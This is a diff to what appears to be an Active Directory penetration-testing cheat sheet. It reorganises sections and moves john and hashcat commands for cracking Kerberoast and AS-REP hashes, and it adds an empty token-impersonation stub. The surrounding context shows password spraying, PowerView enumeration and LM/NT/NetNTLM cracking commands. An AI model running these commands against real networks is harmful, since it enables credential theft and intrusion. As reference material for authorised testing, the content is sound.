@@ -17,12 +17,14 @@ it is the first version of this repo, many things will be added later, so stay t
   - [Enumeration](#domain-enumeration)
     - [GPO enumeration](#gpo-enumeration)
     - [ACL and ACE enumeration](#acl-enumeration)
-  - [Domain Privilege Escalation](#domain-privilege-escalation)
+  - [Privilege Escalation](#privilege-escalation)
+    - [Token Impersonation](#token-impersonation)
     - [Kerberoasting](#kerberoasting)
     - [ASREPRoasting](#asreproasting)
     - [DNSAdmin](#dnsadmin)
   - [Lateral Mouvement](#lateral-mouvement)
     - [WMIExec](#wmiexec)
+    - [Token Impersonation](#token-impersonation)
   - [Credentials Dumping](#credentials-dumping)
     - [LSASS Dumping](#lsass-dumping)
     - [NTDS Dumping](#ntds-dumping)
@@ -278,7 +280,24 @@ crackmapexec smb 10.10.13.100 -u users.txt -p $pass --users | tee userlist.txt
 /opt/kerbrute/dist/kerbrute_linux_amd64 passwordspray -d MEGACORP.CORP --dc 10.10.13.100 users.lst '$pass'
 ```
 
-## Domain Privilege Escalation
+## Privilege Escalation
+
+### Token Impersonation
+
+*requirement :*
+- have enough privileges
+
+
+> The Impersonation token technique allows to impersonate a user by stealing his token, this token allows to exploit this technique because of the SSO processes, Interactive Logon, process running...
+
+
+using [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :
+
+
+using [Incognito](https://github.com/FSecureLABS/incognito) :
+
+
+
 
 ### Kerberoasting
 
@@ -287,12 +306,27 @@ crackmapexec smb 10.10.13.100 -u users.txt -p $pass --users | tee userlist.txt
 Get-DomainUser -SPN | select name,serviceprincipalname
 ```
 
+*crack the hash :*
+
+```bash
+# using JTR :
+john --format=krb5tgs spn.txt --wordlist=wordlist.txt 
+# using hashcat :
+hashcat -m 13100 -a 0 spn.txt wordlist.txt --force
+```
+
 ### ASREPRoasting
 
 **Enumerate asreproastable user**
 ```powershell
 Get-DomainUser -PreauthNotRequired | select name
 ```
+
+
+*cracking the hash :*
+
+`hashcat -m 18200 -a 0 hash wordlist.txt --force`
+
 
 ### DNSAdmin
 
@@ -350,6 +384,8 @@ sc.exe start dns
 ### WMIExec
 
 
+
+
 ## Credentials Dumping
 
 ### LSASS Dumping
@@ -394,7 +430,7 @@ HKU\Software\Classes
 
 ## Hash Cracking
 
-LM :
+> LM :
 ```bash
 # using JTR :
 john --format=lm hash.txt
@@ -402,7 +438,7 @@ john --format=lm hash.txt
 hashcat -m 3000 -a 3 hash.txt
 ```
 
-NT :
+> NT :
 
 ```bash
 # using JTR :
@@ -412,7 +448,7 @@ hashcat -m 1000 -a 3 hash.txt
 ```
 
 
-NTLMv1 :
+> NTLMv1 :
 
 ```bash
 # using JTR :
@@ -421,27 +457,13 @@ john --format=netntlmv1 hash.txt
 hashcat -m 5500 --force -a 0 hash.txt wordlist.txt
 ```
 
-NTLMv2 :
+> NTLMv2 :
 
 ```bash
 # using JTR :
 john --format=netntlmv2 hash.txt
 # using hashcat :
 hashcat -m 5600 --force -a 0 hash.txt wordlist.txt
-```
-
-Kerberoasting :
-
-```bash
-# using JTR :
-john --format=krb5tgs spn.txt --wordlist=wordlist.txt 
-# using hashcat :
-hashcat -m 13100 -a 0 spn.txt wordlist.txt --force
-```
-
-ASREPRoasting :
-```bash
-hashcat -m 18200 -a 0 hash wordlist.txt --force
 ```
 
 note : some Hash Type in hashcat depend of the **etype**
